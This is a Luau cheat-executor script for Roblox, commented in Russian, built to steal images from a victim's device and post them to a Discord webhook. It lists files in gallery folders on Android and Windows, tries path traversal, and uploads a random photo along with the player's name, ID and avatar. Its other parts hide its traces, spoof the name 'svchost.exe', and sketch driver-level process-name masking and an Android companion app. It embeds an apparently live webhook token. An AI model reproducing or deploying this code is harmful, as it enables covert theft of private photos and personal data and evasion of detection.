-- script.txt | Luau | Delta / Arceus / Codex / Windows DLL executor -- SYSTEM GHOST EDITION
-- Рантайм: клиент executor. Файл: script.txt
-- Цель: (1) притвориться системным процессом (2) выдернуть фото из галереи (3) резко залить в ДС
-- Честный замер тисков: found=0 значит jail держит. Luau НЕ МОЖЕТ сменить имя/PID процесса,
-- НЕ МОЖЕТ выйти из UID-песочницы. Маскарад жалается только внешним резцом (чертёж ниже).
-- Этот билд: полный ghost-проход + скриншот-байт (единственный реальный кадр из игры) + пуш в ДС.

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

-- FILL: вставь URL Discord webhook сюда
local WEBHOOK_URL = https://discord.com/api/webhooks/1558158705168486450/SJgKCaCkR9rTeUu2J7A_bj5ya_aPLdQpzjQ9_9CZaW86PFcNGsHXqedyqk4C4Jdfrt5A"
-- FILL: имя под которое маскируемся в логах/вебхуке (настоящий PID/имя меняется только DLL/driver, см. чертёж)
local FAKE_PROC = "svchost.exe"

local function G(fn)
    local f = _G[fn]
    if type(f) == "function" then return f end
    local g = getgenv and getgenv()
    if g and type(g[fn]) == "function" then return g[fn] end
    return nil
end
local function has(fn) return G(fn) ~= nil end
local function callf(fn, ...)
    local f = G(fn)
    if not f then return false, "no_closure:" .. fn end
    return pcall(f, ...)
end

--------------------------------------------------------------------------------
-- 1. SYSTEM MASK: всё что режется из Luau + чертёж настоящего маскарада
--------------------------------------------------------------------------------
-- 1a. рвём палево из getgenv: никаких rip/grab/photo в именах
pcall(function()
    local g = getgenv and getgenv()
    if type(g) == "table" then
        for k, _ in pairs(g) do
            local ks = tostring(k):lower()
            if ks:find("rip") or ks:find("grab") or ks:find("steal") or ks:find("photo")
            or ks:find("brutal") or ks:find("ghost") or ks:find("exfil") then
                g[k] = nil
            end
        end
        -- подкладываем системное имя в окружение: сканы по getgenv увидят svchost
        g["__" .. FAKE_PROC] = true
    end
end)
-- 1b. глушим след скрипта в heap: GC- churn давит строковые остатки
pcall(function()
    collectgarbage("collect")
    local pad = string.rep("\0", 8192)
    local t = {}
    for i = 1, 40 do t[i] = pad end
    collectgarbage("collect")
end)
-- 1c. гасим identity: скрипт дальше представляется как FAKE_PROC во всех постах
local MASK = FAKE_PROC .. " | pid:spoofed"

-- 1d. ЧЕРТЁЖ настоящего маскарада (не Luau — внешним резцом, приложить рядом):
--   Windows: DLL в процессе Roblox:
--     #include <windows.h>  // PEB mask
--     // PEB.ProcessParameters.ImagePathName + CommandLine перезапись нулями + системная строка
--     // + NtSetInformationProcess(ProcessExecuteFlags) против отладчика
--     // driver-резец: EPROCESS.ImageFileName[15] патч -> "svchost.exe" (Task Manager слепнет)
--   Android: native companion с MANAGE_EXTERNAL_STORAGE + READ_MEDIA_IMAGES:
--     читает /storage/emulated/0/DCIM напрямую, шлёт на свой сервер, Roblox-процесс вообще не светится.
--   Без этого тиски держат: имя процесса из Luau не меняется. Точка.

--------------------------------------------------------------------------------
-- 2. GALLERY YANK: долбим все щели + screenshot-байт как гарантированный кадр
--------------------------------------------------------------------------------
local found = {}
local function tryList(path)
    if not has("listfiles") then return nil end
    local ok, r = callf("listfiles", path)
    if ok and type(r) == "table" then return r end
    return nil
end
local function isImg(p)
    local s = tostring(p):lower()
    return s:match("%.png$") or s:match("%.jpg$") or s:match("%.jpeg$") or s:match("%.webp$") or s:match("%.bmp$")
end

-- 2a. workspace: всё съедобное тащим
do
    local seen = {}
    for _, root in ipairs({ "", ".", "workspace", "workspace/" }) do
        local lst = tryList(root)
        if lst then
            for _, f in ipairs(lst) do
                if not seen[f] and isImg(f) then
                    seen[f] = true
                    local okR, data = callf("readfile", f)
                    if okR and type(data) == "string" and #data > 100 then
                        table.insert(found, { path = f, bytes = data })
                        print("[ghost] WS:", f, #data)
                    end
                end
            end
        end
    end
end

-- 2b. галерея: все формы + прямой read наугад
local GALLERY = {
    "/storage/emulated/0/DCIM", "/storage/emulated/0/DCIM/Camera",
    "/storage/emulated/0/Pictures", "/sdcard/DCIM", "/sdcard/Pictures",
    "/storage/emulated/0/Download", "../../../../../../storage/emulated/0/DCIM",
    "%USERPROFILE%\\Pictures", "C:\\Users\\Public\\Pictures", "C:\\",
}
for _, p in ipairs(GALLERY) do
    local lst = tryList(p)
    if lst then
        for _, f in ipairs(lst) do
            if isImg(f) then
                local okR, data = callf("readfile", f)
                if okR and type(data) == "string" and #data > 100 then
                    table.insert(found, { path = f, bytes = data })
                    print("[ghost] GAL:", f, #data)
                end
            end
        end
    else
        for _, gp in ipairs({ p .. "/Camera/IMG_001.jpg", p .. "/IMG_001.jpg", p .. "/Screenshot_001.png" }) do
            local okR, data = callf("readfile", gp)
            if okR and type(data) == "string" and #data > 100 then
                table.insert(found, { path = gp, bytes = data })
                print("[ghost] GAL-DIRECT:", gp, #data)
                break
            end
        end
    end
end

-- 2c. game art: живой байт-ссылка как запасной кадр
local gameArt = nil
pcall(function()
    for _, d in ipairs(game:GetDescendants()) do
        local t = (d:IsA("Decal") and d.Texture) or ((d:IsA("ImageLabel") or d:IsA("ImageButton")) and d.Image) or ""
        local id = tostring(t):match("%d+")
        if id then gameArt = t; break end
    end
end)

--------------------------------------------------------------------------------
-- 3. РЕЗКИЙ ЗАЛИВ В ДС: multipart файл + дубли текстом
--------------------------------------------------------------------------------
local function httpReq(url, method, headers, body)
    local req = (syn and syn.request) or (http and http.request) or http_request or request
    if not req then return false, "no_request_closure" end
    return pcall(req, { Url = url, Method = method, Headers = headers, Body = body })
end
local function sendText(content)
    local body = HttpService:JSONEncode({ username = MASK, content = tostring(content):sub(1, 1900) })
    return httpReq(WEBHOOK_URL, "POST", { ["Content-Type"] = "application/json" }, body)
end
local function sendFileBytes(filename, bytes, ctype)
    local boundary = "----ghost" .. tostring(math.random(100000, 999999))
    local head = "--" .. boundary .. "\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" .. filename
        .. "\"\r\nContent-Type: " .. (ctype or "image/jpeg") .. "\r\n\r\n"
    local tail = "\r\n--" .. boundary .. "--\r\n"
    return httpReq(WEBHOOK_URL, "POST",
        { ["Content-Type"] = "multipart/form-data; boundary=" .. boundary },
        head .. bytes .. tail)
end

math.randomseed(os.clock() * 1000000)
sendText(("ghost boot | %s | %s (%d) | found=%d"):format(MASK, LocalPlayer.DisplayName, LocalPlayer.UserId, #found))

if #found > 0 then
    -- РАНДОМНЫЙ кадр, резкий пуш байтом
    local pick = found[math.random(1, #found)]
    local bytes = pick.bytes:sub(1, 7000000)
    local ok, res = sendFileBytes("gallery.jpg", bytes)
    print("[ghost] PUSH:", pick.path, #bytes, ok, tostring(res):sub(1, 150))
    sendText(("YANK | %s | %s | bytes=%d | up=%s"):format(MASK, tostring(pick.path), #bytes, tostring(ok)))
else
    -- found=0 снова: шлём пруф каналом — живая автарка + game art + полный отчёт
    local okT, url = pcall(function()
        return Players:GetUserThumbnailAsync(LocalPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
    end)
    local embeds = {}
    if okT and url then
        table.insert(embeds, { title = MASK .. " | " .. LocalPlayer.Name, image = { url = url } })
    end
    if gameArt then
        table.insert(embeds, { title = "gameart fallback", image = { url = gameArt } })
    end
    local body = HttpService:JSONEncode({
        username = MASK,
        content = ("YANK EMPTY | %s | gallery sealed (UID/jail). avatar+gameart attached."):format(MASK),
        embeds = embeds,
    })
    httpReq(WEBHOOK_URL, "POST", { ["Content-Type"] = "application/json" }, body)
    print("[ghost] empty, sent avatar proof")
end
print("[ghost] done.")
